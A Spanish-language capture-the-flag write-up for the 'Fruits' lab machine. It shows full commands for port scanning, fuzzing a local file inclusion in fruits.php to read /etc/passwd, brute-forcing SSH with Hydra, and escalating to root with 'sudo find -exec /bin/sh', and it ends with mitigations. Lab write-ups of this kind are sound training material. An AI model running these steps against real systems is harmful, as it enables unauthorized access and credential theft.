# Fruits — The Hackers Labs

**Autor:** Carlos de la Cruz · ASIX 2
**Dificultad:** Media · **Plataforma:** The Hackers Labs

> Resumen de la intrusión: fuzzing en busca de parámetro vulnerable → LFI en `fruits.php` lee `/etc/passwd` → usuario filtrado → fuerza bruta SSH → escalada mediante `sudo find`.

---

## 1. Reconocimiento de puertos

Lanzamos un reconocimiento profundo con Nmap sobre 10.0.2.11, forzando velocidad y desactivando ping/DNS para acelerar el barrido completo de los 65 535 puertos.

```bash
nmap -sSVC -p- -Pn -n --min-rate 5000 -vvv 10.0.2.11
```

![Escaneo Nmap](images/01-nmap.png)

El escaneo identifica **dos servicios**: **22 (SSH)** con OpenSSH 9.2p1 y **80 (HTTP)** con Apache 2.4.57. La web tiene por título "Página de Frutas".

![Resultado Nmap y web de frutas](images/02-web.png)

---

## 2. Primera pista en la web

La página no muestra nada de valor a simple vista, pero al usar el **campo de búsqueda** y pulsar Enter aparece información relevante en la URL, lo que sugiere un parámetro manipulable.

---

## 3. Fuzzing (y un rabbit hole)

Probamos **wfuzz** para descubrir archivos `.php` ocultos con `rockyou.txt`, 200 hilos y filtrando respuestas 404/301. Este camino, sin embargo, resulta ser un **rabbit hole** (madriguera de conejo): consume tiempo sin llevar a nada útil.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/rockyou.txt -u http://10.0.2.11/FUZZ.php --hh=301
```

![Fuzzing con wfuzz](images/03-wfuzz.png)

---

## 4. LFI en fruits.php

Cambiamos de estrategia y buscamos una vulnerabilidad de **LFI (Local File Inclusion)** en `fruits.php`. En lugar de buscar archivos nuevos, fuzzeamos **nombres de parámetro** que fuercen la lectura de `/etc/passwd`, filtrando por una sola línea (`--hl=1`) para detectar el cambio real cuando el servidor cargue el contenido del sistema.

```bash
wfuzz -c --hl=1 -w /usr/share/wordlists/dirb/big.txt -u "http://10.0.2.11/fruits.php?FUZZ=/etc/passwd"
```

El parámetro válido resulta ser **`file`**. Al visitarlo en el navegador, leemos `/etc/passwd` y descubrimos un usuario interesante: **`bananaman`**.

```
http://10.0.2.11/fruits.php?file=/etc/passwd
```

![LFI leyendo /etc/passwd](images/04-lfi.png)

---

## 5. Fuerza bruta SSH y primera flag

Con el usuario `bananaman`, atacamos SSH con **Hydra** y `rockyou.txt`.

```bash
hydra -l bananaman -P /usr/share/wordlists/rockyou.txt 10.0.2.11 ssh
```

Hydra devuelve la contraseña: **`celtic`**. Nos conectamos por SSH, hacemos `ls` y leemos `user.txt` con `cat` para obtener la **flag de usuario**.

![Hydra y flag de usuario](images/05-hydra-userflag.png)

---

## 6. Escalada de privilegios (sudo find)

`sudo -l` revela que `bananaman` puede ejecutar **`/usr/bin/find` como root sin contraseña** (`NOPASSWD`). Como `find` permite ejecutar comandos externos con `-exec`, lo usamos para abrir una shell privilegiada:

```bash
sudo -u root find . -exec /bin/sh \; -quit
```

Desglose del comando:
- `sudo -u root`: ejecuta la tarea como root.
- `find .`: busca en el directorio actual.
- `-exec /bin/sh`: por cada resultado, lanza una shell interactiva (la parte crítica).
- `\;`: marca el final del comando de `-exec`.
- `-quit`: detiene el proceso tras el primer resultado para no abrir múltiples shells.

Ya como root, nos movemos a `/root` y leemos `root.txt` con `cat` para capturar la **flag final**.

![Escalada con sudo find y flag de root](images/06-rootflag.png)

---

## Conclusión

Fruits ilustra una cadena web → sistema muy realista: un **LFI** que filtra usuarios del sistema, seguido de fuerza bruta SSH y una escalada por `sudo find` (GTFOBins). También muestra la importancia de reconocer un **rabbit hole** a tiempo para no perder horas. Mitigaciones: validar y restringir los parámetros de inclusión de ficheros, reforzar credenciales y limitar los permisos `sudo`.
